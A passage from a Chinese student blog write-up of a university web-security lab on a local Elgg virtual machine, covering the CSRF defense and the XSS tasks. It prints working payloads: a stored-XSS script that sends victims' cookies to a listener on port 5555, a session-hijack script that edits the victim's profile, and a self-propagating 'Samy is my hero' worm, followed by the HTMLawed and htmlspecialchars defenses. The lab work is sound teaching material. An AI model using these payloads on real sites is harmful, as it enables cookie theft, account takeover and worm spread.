+<p>首先进入目录
+/var/www/CSRF/Elgg/vendor/elgg/elgg/engine/classes/Elgg，找到
+ActionService.php 文件中的 gatekeeper() 函数，并注释掉 return true
+语句。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620231737340.png"
+alt="image-20240620231737340" />
+<figcaption aria-hidden="true">image-20240620231737340</figcaption>
+</figure>
+<p>所有 3 次攻击均失败：</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232609700.png"
+alt="image-20240620232609700" />
+<figcaption aria-hidden="true">image-20240620232609700</figcaption>
+</figure>
+<p>GET 请求没有 token：</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232620176.png"
+alt="image-20240620232620176" />
+<figcaption aria-hidden="true">image-20240620232620176</figcaption>
+</figure>
+<p>POST 请求没有 token：</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232830171.png"
+alt="image-20240620232830171" />
+<figcaption aria-hidden="true">image-20240620232830171</figcaption>
+</figure>
+<p>登录没有 token：</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232359807.png"
+alt="image-20240620232359807" />
+<figcaption aria-hidden="true">image-20240620232359807</figcaption>
+</figure>
+<h2
+id="跨站脚本xss攻击实验"><strong>跨站脚本（XSS）攻击实验</strong></h2>
+<p>首先需要切换网站，切换到 http://www.xsslabelgg.com。</p>
+<h3 id="任务-1从受害者机器窃取-cookie"><strong>任务 1：从受害者机器窃取
+Cookie</strong></h3>
+<p>使用 samy 登录，修改 samy 的个人资料。在“关于我”字段中，首先点击编辑
+HTML，添加以下内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=http://127.0.0.1:5555?c=&#x27;</span> + <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) +  <span class="string">&#x27;&gt;&#x27;</span>); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621102354596.png"
+alt="image-20240621102354596" />
+<figcaption aria-hidden="true">image-20240621102354596</figcaption>
+</figure>
+<p>切换到 Alice 并查看 Samy 的主页，使用 nc 监听 5555 端口
+<code>nc -l 5555 -v</code> 来查看数据包信息，HTTP Header Live
+也有效。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621102835358.png"
+alt="image-20240621102835358" />
+<figcaption aria-hidden="true">image-20240621102835358</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621103053599.png"
+alt="image-20240621103053599" />
+<figcaption aria-hidden="true">image-20240621103053599</figcaption>
+</figure>
+<h3 id="任务-2使用-ajax-脚本自动发起会话劫持"><strong>任务 2：使用 Ajax
+脚本自动发起会话劫持</strong></h3>
+<p>使用 samy 登录，修改 samy 的个人资料。在“关于我”字段中，首先点击编辑
+HTML，添加以下内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ts = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> token = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> guid = elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.xsslabelgg.com/action/profile/edit&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">            &#125;,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_ts</span>: ts,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_token</span>: token,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">guid</span>: guid,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">briefdescription</span>: <span class="string">&quot;Samy is my hero&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">            &#125;)  </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+<p>然后，切换到使用 Alice 登录，从 Alice 的界面打开 Samy
+的主页进行查看。通过 HTTP Header Live 插件，发现已发送修改简要描述的
+POST 请求，达成攻击效果。发送的 HTTP 数据包：</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621104726870.png"
+alt="image-20240621104726870" />
+<figcaption aria-hidden="true">image-20240621104726870</figcaption>
+</figure>
+<h3 id="任务-3构造-xss-蠕虫"><strong>任务 3：构造 XSS 蠕虫</strong></h3>
+<p>使用 samy 登录，修改 samy 的个人资料。在“关于我”字段中，首先点击编辑
+HTML，添加以下内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&#x27;worm&#x27;</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ts = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> token = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> guid = elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.xsslabelgg.com/action/profile/edit&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">            &#125;,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_ts</span>: ts,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_token</span>: token,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">guid</span>: guid,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">briefdescription</span>: <span class="string">&quot;Samy is my hero&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">description</span>: <span class="string">&quot;&lt;script id=&#x27;worm&#x27;&gt;&quot;</span> + <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;worm&#x27;</span>).<span class="property">innerHTML</span> + <span class="string">&quot;&lt;\/script&gt;&quot;</span>  </span></span><br><span class="line"><span class="language-javascript">            &#125;)  </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">3000</span>)  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+<p>然后，切换到使用 Alice 登录，从 Alice 的界面打开 Samy
+的主页进行查看。通过 HTTP Header Live 插件，发现已发送修改简要描述的
+POST 请求，达成攻击效果。发送的 HTTP 数据包：</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621105412187.png"
+alt="image-20240621105412187" />
+<figcaption aria-hidden="true">image-20240621105412187</figcaption>
+</figure>
+<p>与上述不同的是，此 POST 数据包的描述字段被修改为恶意 XSS
+脚本本身，从而创造了传播性。修改 Alice
+个人资料的具体数据包内容如下。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621110705476.png"
+alt="image-20240621110705476" />
+<figcaption aria-hidden="true">image-20240621110705476</figcaption>
+</figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">http://www.xsslabelgg.com/action/profile/edit</span><br><span class="line">Host: www.xsslabelgg.com</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://www.xsslabelgg.com/profile/samy</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">origin: http://www.xsslabelgg.com</span><br><span class="line">Content-Length: 1136</span><br><span class="line">Cookie: Elgg=jl5l97kq1k4todunjgn0ek8ft0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">__elgg_ts=1718938378&amp;__elgg_token=P-0B7cbe_msL5vOGF0n8AQ&amp;guid=44&amp;briefdescription=Samy is my hero&amp;description=&lt;script id=&#x27;worm&#x27;&gt;  </span><br><span class="line">    setTimeout(() =&gt; &#123;  </span><br><span class="line">        var ts = elgg.security.token.__elgg_ts;  </span><br><span class="line">        var token = elgg.security.token.__elgg_token;  </span><br><span class="line">        var guid = elgg.session.user.guid;  </span><br><span class="line">        fetch(&#x27;http://www.xsslabelgg.com/action/profile/edit&#x27;, &#123;  </span><br><span class="line">            credentials: &#x27;include&#x27;,  </span><br><span class="line">            method: &#x27;POST&#x27;,  </span><br><span class="line">            headers: &#123;  </span><br><span class="line">                &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;  </span><br><span class="line">            &#125;,  </span><br><span class="line">            body: new URLSearchParams(&#123;  </span><br><span class="line">                __elgg_ts: ts,  </span><br><span class="line">                __elgg_token: token,  </span><br><span class="line">                guid: guid,  </span><br><span class="line">                briefdescription: &quot;Samy is my hero&quot;,  </span><br><span class="line">                description: &quot;&lt;script id=&#x27;worm&#x27;&gt;&quot; + document.getElementById(&#x27;worm&#x27;).innerHTML + &quot;&lt;\/script&gt;&quot;  </span><br><span class="line">            &#125;)  </span><br><span class="line">        &#125;)  </span><br><span class="line">    &#125;, 3000)  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">POST: HTTP/1.1 302 Found</span><br><span class="line">Date: Fri, 21 Jun 2024 02:53:01 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Location: http://www.xsslabelgg.com/profile/alice</span><br><span class="line">Content-Length: 0</span><br><span class="line">Keep-Alive: timeout=5, max=97</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br></pre></td></tr></table></figure>
+<p>以 Boby 登录并访问 Alice 的个人资料，也可以获取修改个人资料的 POST
+数据包，Boby 的介绍也被修改为同一句话：</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621111233972.png"
+alt="image-20240621111233972" />
+<figcaption aria-hidden="true">image-20240621111233972</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621111431159.png"
+alt="image-20240621111431159" />
+<figcaption aria-hidden="true">image-20240621111431159</figcaption>
+</figure>
+<h3 id="任务-4防御策略-1"><strong>任务 4：防御策略</strong></h3>
+<h4 id="仅启用-htmlawed-1.9">仅启用 HTMLawed 1.9</h4>
+Elgg 默认有防御策略。虚拟机已禁用并注释掉相应的防御策略。实际上，Elgg
+Web 应用程序最初启用了一个自定义安全插件
+HTMLawed，它验证用户输入并移除输入中的标签。这个特定插件被注册到
+elgg/engine/lib/input.php 文件中的过滤标签功能。例如，它将
+<script>
+标签转换为
+<p>
+<p>，以便 JavaScript 脚本无法执行。</p>
+<p>进入账户→管理（顶部菜单）→插件（右侧面板），然后从下拉菜单中选择安全和垃圾邮件，点击过滤。找到下面的
+HTMLawed 1.8 插件。点击激活以启用策略。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621120050952.png"
+alt="image-20240621120050952" />
+<figcaption aria-hidden="true">image-20240621120050952</figcaption>
+</figure>
+<p>再次访问 Samy 的主页并尝试修改，发现 script 标签被转换为 p
+标签，插入的 js 语句格式被转换，无法执行。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621120305885.png"
+alt="image-20240621120305885" />
+<figcaption aria-hidden="true">image-20240621120305885</figcaption>
+</figure>
+<h4 id="启用-htmlawed-1.9-和-htmlspecialchars">启用 HTMLawed 1.9 和
+htmlspecialchars</h4>
+<p><code>htmlspecialchars</code> 函数将以下特殊字符转换为相应的 HTML
+实体：</p>
+<ul>
+<li><code>&amp;</code> 转换为 &amp;amp;</li>
+<li><code>&lt;</code> 转换为 &amp;lt;</li>
+<li><code>&gt;</code> 转换为 &amp;gt;</li>
+<li><code>"</code> 转换为 &amp;quot;</li>
+<li><code>'</code> 转换为 &amp;#039;</li>
+</ul>
+<p>我们以超级用户身份进入目录
+<code>/var/www/XSS/Elgg/vendor/elgg/elgg/views/default/output/</code>，使用
+vim 进入调用 <code>htmlspecialchars()</code>
+函数的文件：text.php、url.php、dropdown.php、email.php。在每个文件中，取消注释相应的
+<code>htmlspecialchars()</code> 函数调用。使用的命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo su </span><br><span class="line">cd /var/www/XSS/Elgg/vendor/elgg/elgg/views/default/output/</span><br><span class="line">vim text.php </span><br><span class="line">vim url.php </span><br><span class="line">vim dropdown.php </span><br><span class="line">vim email.php </span><br></pre></td></tr></table></figure>
+<p>text.php:</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121244426.png"
+alt="image-20240621121244426" />
+<figcaption aria-hidden="true">image-20240621121244426</figcaption>
+</figure>
+<p>url.php</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121416527.png"
+alt="image-20240621121416527" />
+<figcaption aria-hidden="true">image-20240621121416527</figcaption>
+</figure>
+<p>dropdown.php</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121450425.png"
+alt="image-20240621121450425" />
+<figcaption aria-hidden="true">image-20240621121450425</figcaption>
+</figure>
+<p>email.php</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121538048.png"
+alt="image-20240621121538048" />
+<figcaption aria-hidden="true">image-20240621121538048</figcaption>
+</figure>
+<p>访问 Samy 的主页，发现一些特殊符号已被转换为实体符号，js
+语句无法执行：</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621123332775.png"
+alt="image-20240621123332775" />
+<figcaption aria-hidden="true">image-20240621123332775</figcaption>
+</figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xloverflow.github.io/zh">Xiang Li</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xloverflow.github.io/zh/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/">https://xloverflow.github.io/zh/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://xloverflow.github.io/zh" target="_blank">Life is not a race, but a journey</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/zh/tags/Study-Notes/">Study Notes</a><a class="post-meta__tags" href="/zh/tags/Course-Experiments/">Course Experiments</a></div><div class="post-share"><div class="social-share" data-image="https://pic1.zhimg.com/80/v2-416f1b8d4133d67e746a67adbb40f508_720w.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/zh/2025/10/02/Deep-Learning/CNN_P1/" title="CNNs - Part 1"><img class="cover" src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20251002142654568.png" onerror="onerror=null;src='/zh/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">CNNs - Part 1</div></div><div class="info-2"><div class="info-item-1">Notes on Convolutional Neural Networks (CNN)</div></div></div></a><a class="pagination-related" href="/zh/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab2-System%20Security/" title="HUST Information System Security Lab2-System Security"><img class="cover" src="https://picx.zhimg.com/80/v2-06450eedf96def79a590cec5c6c0ecbd_720w.png" onerror="onerror=null;src='/zh/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">HUST Information System Security Lab2-System Security</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Information System Security Lab2</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/zh/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab1-Software%20Security/" title="HUST Information System Security Lab1-Software Security"><img class="cover" src="https://t3.chei.com.cn/zyk/zybk/zyjd/cdn/showImg/ikb2ll7ejr4ufkfj.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="info-item-2">HUST Information System Security Lab1-Software Security</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Information System Security Lab1</div></div></div></a><a class="pagination-related" href="/zh/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab2-System%20Security/" title="HUST Information System Security Lab2-System Security"><img class="cover" src="https://picx.zhimg.com/80/v2-06450eedf96def79a590cec5c6c0ecbd_720w.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="info-item-2">HUST Information System Security Lab2-System Security</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Information System Security Lab2</div></div></div></a><a class="pagination-related" href="/zh/2023/11/29/HUST-Labs/HUST%20Operating%20System%20Lab2:%20Process&Thread%20Synchronization%20Mechanisms%20and%20Application%20Programming/" title="HUST Operating System Lab2: Process&amp;Thread Synchronization Mechanisms and Application Programming"><img class="cover" src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/v2osk-1Z2niiBPg5A-unsplash.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-29</div><div class="info-item-2">HUST Operating System Lab2: Process&amp;Thread Synchronization Mechanisms and Application Programming</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Operating System Lab2</div></div></div></a><a class="pagination-related" href="/zh/2023/12/05/HUST-Labs/HUST%20Operating%20System%20Lab3:%20Memory%20Management/" title="HUST Operating System Lab3: Memory Management"><img class="cover" src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/david-marcu-78A265wPiO4-unsplash.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-05</div><div class="info-item-2">HUST Operating System Lab3: Memory Management</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Operating System Lab3</div></div></div></a><a class="pagination-related" href="/zh/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Architectures/" title="11711 Advanced NLP: Architectures"><img class="cover" src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260126152238836.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-29</div><div class="info-item-2">11711 Advanced NLP: Architectures</div></div><div class="info-2"><div class="info-item-1">关于CMU 11-711高级自然语言处理的RNN架构、编码器-解码器模型和注意力机制的笔记。</div></div></div></a><a class="pagination-related" href="/zh/2026/01/23/11711-Advanced-NLP/11711-Advanced-NLP-Fundamentals/" title="11711 Advanced NLP: Fundamentals"><img class="cover" src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260126152238836.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-22</div><div class="info-item-2">11711 Advanced NLP: Fundamentals</div></div><div class="info-2"><div class="info-item-1">CMU 11-711 高级自然语言处理的笔记和总结。</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://pica.zhimg.com/80/v2-b6830c2136b7784c0aba649af7ec2867_1440w.jpeg" onerror="this.onerror=null;this.src='/zh/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Xiang Li</div><div class="author-info-description">Xiang Li 的中文博客</div><div class="site-data"><a href="/zh/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/zh/tags/"><div class="headline">标签</div><div class="length-num">62</div></a><a href="/zh/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XLOverflow"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Talk is cheap. Show me the code.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">信息系统安全实验3记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0csrf%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C"><span class="toc-number">1.1.</span> <span class="toc-text">跨站请求伪造（CSRF）攻击实验</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-1%E5%9F%BA%E4%BA%8E-get-%E8%AF%B7%E6%B1%82%E7%9A%84-csrf-%E6%94%BB%E5%87%BB"><span class="toc-number">1.1.1.</span> <span class="toc-text">任务 1：基于 GET 请求的
+CSRF 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-2%E4%BD%BF%E7%94%A8-post-%E8%AF%B7%E6%B1%82%E7%9A%84-csrf-%E6%94%BB%E5%87%BB"><span class="toc-number">1.1.2.</span> <span class="toc-text">任务 2：使用 POST
+请求的 CSRF 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-3%E5%AE%9E%E7%8E%B0%E7%99%BB%E5%BD%95-csrf-%E6%94%BB%E5%87%BB"><span class="toc-number">1.1.3.</span> <span class="toc-text">任务 3：实现登录 CSRF
+攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-4%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5"><span class="toc-number">1.1.4.</span> <span class="toc-text">任务 4：防御策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C"><span class="toc-number">1.2.</span> <span class="toc-text">跨站脚本（XSS）攻击实验</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-1%E4%BB%8E%E5%8F%97%E5%AE%B3%E8%80%85%E6%9C%BA%E5%99%A8%E7%AA%83%E5%8F%96-cookie"><span class="toc-number">1.2.1.</span> <span class="toc-text">任务 1：从受害者机器窃取
+Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-2%E4%BD%BF%E7%94%A8-ajax-%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8F%91%E8%B5%B7%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81"><span class="toc-number">1.2.2.</span> <span class="toc-text">任务 2：使用 Ajax
